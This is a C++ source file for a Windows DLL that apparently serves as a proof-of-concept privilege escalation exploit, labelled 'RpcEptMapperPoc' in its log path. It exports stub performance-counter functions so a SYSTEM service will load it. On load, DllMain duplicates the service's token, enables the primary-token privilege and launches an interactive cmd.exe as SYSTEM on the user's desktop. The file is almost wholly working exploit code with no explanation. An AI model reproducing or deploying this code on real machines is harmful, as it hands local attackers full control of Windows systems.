#include <iostream>
#include <strsafe.h>
#include <userenv.h>
#include <Windows.h>
#include <Wtsapi32.h>

#pragma comment(lib,"ntdll.lib")
#pragma comment(lib,"userenv.lib")
#pragma comment(lib,"Wtsapi32.lib")

extern "C" __declspec(dllexport) DWORD APIENTRY OpenPerfData(LPWSTR pContext);
extern "C" __declspec(dllexport) DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID * ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
extern "C" __declspec(dllexport) DWORD APIENTRY ClosePerfData();

DWORD APIENTRY OpenPerfData(LPWSTR pContext)
{
    return ERROR_SUCCESS;
}

DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned)
{
    return ERROR_SUCCESS;
}

DWORD APIENTRY ClosePerfData()
{
    return ERROR_SUCCESS;
}

void LogToFile(LPCWSTR pwszFilename, LPWSTR pwszLog)
{
    HANDLE hFile;
    DWORD dwBytesWritten;

    hFile = CreateFile(pwszFilename, FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        WriteFile(hFile, pwszLog, (DWORD)wcslen(pwszLog) * sizeof(WCHAR), &dwBytesWritten, NULL);
        CloseHandle(hFile);
    }
}

void LogError(LPCWSTR lpszFunction)
{
    LPWSTR lpErrorMsg, lpMsgBuffer;
    DWORD dwLastError = GetLastError();
    DWORD dwBufSize = 0;

    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        dwLastError,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&lpErrorMsg,
        0, 
        NULL
    );

    dwBufSize = 4096 * sizeof(WCHAR);
    lpMsgBuffer = (LPWSTR) malloc(dwBufSize);
    if (lpMsgBuffer)
    {
        StringCchPrintf(lpMsgBuffer, dwBufSize, L"%s - Error(%d): %s\r\n", lpszFunction, dwLastError, lpErrorMsg);
        LogToFile(L"C:\\LOGS\\RpcEptMapperPoc.log", lpMsgBuffer);

        free(lpErrorMsg);
        free(lpMsgBuffer);
    }
}

BOOL EnablePrivilege(HANDLE hTokenIn, LPCTSTR privilege)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;
    HANDLE hToken;

    if (hTokenIn == NULL)
    {
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
            return FALSE;
    }
    else hToken = hTokenIn;

    if (!LookupPrivilegeValue(NULL, privilege, &luid))
        return FALSE;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
        return FALSE;

    return TRUE;
}

void ExecuteAsSystem()
{
    HANDLE hFoobar = NULL, hProcessToken = NULL, hToken = NULL;
    LPVOID lpEnvironment = NULL;
    DWORD dwSessionId = WTSGetActiveConsoleSessionId();
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    wchar_t command[] = L"C:\\Windows\\System32\\cmd.exe";

    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.lpDesktop = LPTSTR(L"WinSta0\\default");
    ZeroMemory(&pi, sizeof(pi));

    if (!WTSQueryUserToken(dwSessionId, &hFoobar))
    {
        LogError(L"WTSQueryUserToken");
        goto cleanup;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hProcessToken))
    {
        LogError(L"OpenProcessToken");
        goto cleanup;
    }

    if (!DuplicateTokenEx(hProcessToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hToken)) 
    {
        LogError(L"DuplicateTokenEx");
        goto cleanup;
    }

    if (!EnablePrivilege(hToken, SE_ASSIGNPRIMARYTOKEN_NAME))
    {
        LogError(L"EnablePrivilege");
        goto cleanup;
    }

    if (!SetTokenInformation(hToken, TokenSessionId, &dwSessionId, sizeof(dwSessionId)))
    {
        LogError(L"SetTokenInformation");
        goto cleanup;
    }

    if (!CreateEnvironmentBlock(&lpEnvironment, hToken, FALSE))
    {
        LogError(L"CreateEnvironmentBlock");
        goto cleanup;
    }

    if (!CreateProcessAsUser(
        hToken,
        NULL,
        command,
        NULL,
        NULL,
        FALSE,
        NORMAL_PRIORITY_CLASS | CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE | CREATE_BREAKAWAY_FROM_JOB,
        lpEnvironment,
        NULL,
        &si,
        &pi
    ))
    {
        LogError(L"CreateProcessAsUser");
        goto cleanup;
    }

cleanup:

    if (hFoobar) CloseHandle(hFoobar);
    if(hProcessToken) CloseHandle(hProcessToken);
    if(hToken) CloseHandle(hToken);
    
}

extern "C" BOOL WINAPI DllMain(HINSTANCE const instance, DWORD const reason, LPVOID const reserved)
{
    switch (reason)
    {
    case DLL_PROCESS_ATTACH:
        ExecuteAsSystem();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
